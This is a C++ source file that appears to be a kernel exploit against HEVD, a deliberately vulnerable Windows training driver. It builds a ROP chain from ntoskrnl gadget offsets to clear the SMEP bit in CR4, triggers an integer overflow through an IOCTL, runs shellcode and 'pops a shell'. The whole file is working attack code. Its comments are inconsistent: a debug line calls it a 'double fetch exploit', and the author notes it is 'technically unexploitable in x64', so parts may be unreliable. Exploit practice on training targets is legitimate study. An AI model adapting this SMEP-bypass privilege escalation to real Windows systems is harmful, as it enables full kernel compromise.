#include "PreExploitation.hpp"
#include "IntegerOverflow.hpp"
#include "PostExploitation.hpp"
#include "HEVDCommunication.hpp"

namespace IntegerOverflow
{

void disable_smep_rop(ByteVector& in_buffer, Address64 shellcode_address)
{
	std::memset(in_buffer.data(), 0xAA, OFFSET_TO_RIP);

	const Address64 ntos_address = PreExploitation::leak_ntos_base();

	static constexpr Address64 CR4_AND_MASK = 0xFFFFFFFFFFEFFFFF;
	const Address64 MOV_RAX_CR4 = ntos_address + 0xba57bc; // Unwanted byproduct of this one that it also flips on MCE
	const Address64 POP_RCX = ntos_address + 0x2157e5;
	const Address64 AND_RAX_RCX = ntos_address + 0x5a7c3a;
	const Address64 MOV_CR4_RAX = ntos_address + 0xba57c3;

	std::vector<Address64> rop_chain_raw = {
		MOV_RAX_CR4,
		POP_RCX,
		CR4_AND_MASK,
		AND_RAX_RCX,
		MOV_CR4_RAX,
		shellcode_address
	};

	size_t current_index = OFFSET_TO_RIP;
	for (Address64 current_gadget : rop_chain_raw)
	{
		std::memcpy(in_buffer.data() + current_index, &current_gadget, sizeof(Address64));
		current_index += sizeof(Address64);
	}
}

void exploit()
{
	// Technically unexploitable in x64. DWORD is passed onto a 64 bit register and compared to a 64 bit register (0x800). This exploit will work in 32 bit (considering switching Address64 to Address32)
	// This was fixed in 2020 but the latest release of HEVD is from 2019, this should work on the 2020 unreleased version.
	DEBUG_PRINT("[+] Starting double fetch exploit...\n");

	HEVDCommunication hevd;

	ByteVector overflow_buffer;
	overflow_buffer.resize(OVERFLOW_BUFFER_SIZE);

	Address64 shellcode_address = PreExploitation::prepare_shellcode();
	DEBUG_PRINT("[+] Shellcode Address -> ");
	DEBUG_PRINT(std::to_string(shellcode_address));
	disable_smep_rop(overflow_buffer, shellcode_address);

	static constexpr DWORD TRIGGER_OVERFLOW_SIZE = UINT32_MAX;
	std::ignore = hevd.call_ioctl(INTEGER_OVERFLOW_IOCTL, overflow_buffer, sizeof(Address64), TRIGGER_OVERFLOW_SIZE);

	DEBUG_PRINT("[+] Popping a shell\n");
	PostExploitation::pop_shell();
}

}